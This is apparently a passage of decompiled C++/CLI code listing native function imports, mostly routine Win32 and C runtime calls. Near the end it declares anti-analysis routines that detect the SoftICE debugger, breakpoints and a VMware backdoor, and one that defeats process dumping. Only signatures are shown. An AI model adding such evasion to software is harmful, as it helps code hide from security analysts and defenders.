  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern uint GetTickCount();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe HINSTANCE__* GetModuleHandleW([In] char* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* strcpy([In] sbyte* obj0, [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* strstr([In] sbyte* obj0, [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint WaitForSingleObject([In] void* obj0, [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint strlen([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int strncmp([In] sbyte* obj0, [In] sbyte* obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* CreateMutexW([In] _SECURITY_ATTRIBUTES* obj0, [In] int obj1, [In] char* obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void ExitProcess([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int QueryPerformanceFrequency([In] _LARGE_INTEGER* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void srand([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void ExitThread([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int QueryPerformanceCounter([In] _LARGE_INTEGER* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* memcpy([In] void* obj0, [In] void* obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int wcscmp([In] char* obj0, [In] char* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int _access([In] sbyte* obj0, [In] int obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* malloc([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void free([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int CloseHandle([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int CreateProcessW(
    [In] char* obj0,
    [In] char* obj1,
    [In] _SECURITY_ATTRIBUTES* obj2,
    [In] _SECURITY_ATTRIBUTES* obj3,
    [In] int obj4,
    [In] uint obj5,
    [In] void* obj6,
    [In] char* obj7,
    [In] _STARTUPINFOW* obj8,
    [In] _PROCESS_INFORMATION* obj9);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int _vsnprintf([In] sbyte* obj0, [In] uint obj1, [In] sbyte* obj2, [In] sbyte* obj3);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe __FnPtr<int ()> GetProcAddress([In] HINSTANCE__* obj0, [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe HINSTANCE__* LoadLibraryW([In] char* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int GlobalUnlock([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* strdup([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* GlobalLock([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* strncat([In] sbyte* obj0, [In] sbyte* obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* @new([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* GetCurrentProcess();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int GetVersionExW([In] _OSVERSIONINFOW* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int GetLocaleInfoW([In] uint obj0, [In] uint obj1, [In] char* obj2, [In] int obj3);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern ulong GetCycleCount();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int GetTimeFormatW(
    [In] uint obj0,
    [In] uint obj1,
    [In] _SYSTEMTIME* obj2,
    [In] char* obj3,
    [In] char* obj4,
    [In] int obj5);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void GlobalMemoryStatus([In] _MEMORYSTATUS* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int GetDateFormatW(
    [In] uint obj0,
    [In] uint obj1,
    [In] _SYSTEMTIME* obj2,
    [In] char* obj3,
    [In] char* obj4,
    [In] int obj5);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  [return: MarshalAs(UnmanagedType.U1)]
  public static extern bool IsSICELoaded();

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  [return: MarshalAs(UnmanagedType.U1)]
  public static extern unsafe bool IsBPX([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int VMBackDoor([In] uint* obj0, [In] uint* obj1, [In] uint* obj2, [In] uint* obj3);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern void foolProcDump();

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int \u003FA0xc25c7cbf\u002Eswprintf(
    [In] char* obj0,
    [In] uint obj1,
    [In] char* obj2, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int fclose([In] _iobuf* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int fprintf([In] _iobuf* obj0, [In] sbyte* obj1, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void GetLocalTime([In] _SYSTEMTIME* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _iobuf* _wfopen([In] char* obj0, [In] char* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe char* wcscat([In] char* obj0, [In] char* obj1);
}
